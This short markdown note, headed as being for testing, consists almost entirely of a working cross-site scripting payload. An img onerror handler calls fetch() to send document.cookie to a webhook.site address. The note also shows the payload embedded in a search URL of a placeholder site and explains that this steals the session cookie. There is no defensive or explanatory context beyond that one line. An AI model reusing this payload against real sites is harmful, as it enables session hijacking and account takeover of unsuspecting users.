### Just for testing purposes

Payload
```
<img src=x onerror="fetch(`https://webhook.site/3cd37862-c917-46b1-b599-ba1c624bc379?${document.cookie}`).then(response => response.json()).then(data => console.log(data)).catch(error => console.error('Error:', error));">
```

Payload integrated URL (cookie is stolen through a xss vulnerable site)
```
https://www.yoursite.com/search?term=<img src=x onerror="fetch(`https://webhook.site/3cd37862-c917-46b1-b599-ba1c624bc379?${document.cookie}`).then(response => response.json()).then(data => console.log(data)).catch(error => console.error('Error:', error));">
```

This sends session cookie to webhook site.
